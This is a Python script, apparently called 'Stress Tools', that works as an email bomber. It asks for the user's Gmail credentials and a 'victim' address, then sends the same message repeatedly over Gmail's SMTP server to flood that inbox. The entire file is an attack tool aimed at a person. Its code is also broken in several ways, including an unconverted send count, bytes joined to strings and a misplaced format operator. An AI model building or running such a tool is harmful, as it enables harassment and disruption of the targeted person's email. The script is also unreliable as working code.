# -*- coding: utf-8 -*-
#WARN
#Please, Don't Copy Codes Without Owner Permission!!

import os
import random
import smtplib
import sys
import getpass
import time

# ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ Welcome ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

from tqdm import trange
from colorama import Fore

# Progress Bar_Loading:
color_bars =[
    
    Fore.GREEN,
    ]

for color in color_bars:
    for i in trange(int(7**7.5),  #4e5
                    bar_format="{l_bar}%s{bar}%s{r_bar}" % (color, Fore.RESET)):
        pass

os.system('cls')
print ('''
\033[92m
                                                        
.d8888. d888888b d8888b. d88888b .d8888. .d8888.      d888888b  .d88b.   .d88b.  db      .d8888.    
88'  YP `~~88~~' 88  `8D 88'     88'  YP 88'  YP      `~~88~~' .8P  Y8. .8P  Y8. 88      88'  YP    
`8bo.      88    88oobY' 88ooooo `8bo.   `8bo.           88    88    88 88    88 88      `8bo.      
  `Y8b.    88    88`8b   88~~~~~   `Y8b.   `Y8b.         88    88    88 88    88 88        `Y8b.    
db   8D    88    88 `88. 88.     db   8D db   8D         88    `8b  d8' `8b  d8' 88booo. db   8D db 
`8888Y'    YP    88   YD Y88888P `8888Y' `8888Y'         YP     `Y88P'   `Y88P'  Y88888P `8888Y' VP 
                                                                                                    
                                                                                                    
                                                        
                       ©copyright by \033[93mSwami yunii>< \033[97m
''')
print(" ")

#Information:
	
user = input('\033[92mYour \033[92mGmail\033[97m :\033[94m ')
Password = getpass.getpass('\033[92mYour \033[92mPassword\033[97m :\033[94m ')
print(" ")
sender = input('\033[91mTo Victim \033[91mEmail\033[97m : \033[94m')
message = input('\033[92mYour \033[92mMessage\033[97m : \033[94m')
print(" ")
color = input('\033[92mNumber of \033[92msend\033[97m : \033[94m')
print(" ")
print("\033[94m📮\033[92mSending : ")


# SMTP_SERVER_INFO:
smtp_server = 'smtp.gmail.com'
port = 587

#Login:
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()

    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,Password)

# Sending:

    for i in range(1, color+1):
        subject = os.urandom(9)
        message = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user, sender, message)
        print ("\033[94m☑\033[97m Email \033[92mSENT\033[97m  :\033[93m %i") % i
        sys.stdout.flush()
    server.quit()
    print ('\033[93m☑\033[97m All \033[97mMessage was\033[92m sent\033[97m ')
    
    
except KeyboardInterrupt:
    print ('[✘] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("\033[94m⚠️\033[91mError \033[97m:")
    print ('\033[94m⚠️\033[97mThe \033[93musername \033[97mor \033[93mpassword \033[97myou entered is incorrect.')
    print ("\033[94m⚠️\033[91mCheck if the Options of 'Applications are less secure' is enabled\nCheck at https://myaccount.google.com/lesssecureapps")
    sys.exit()
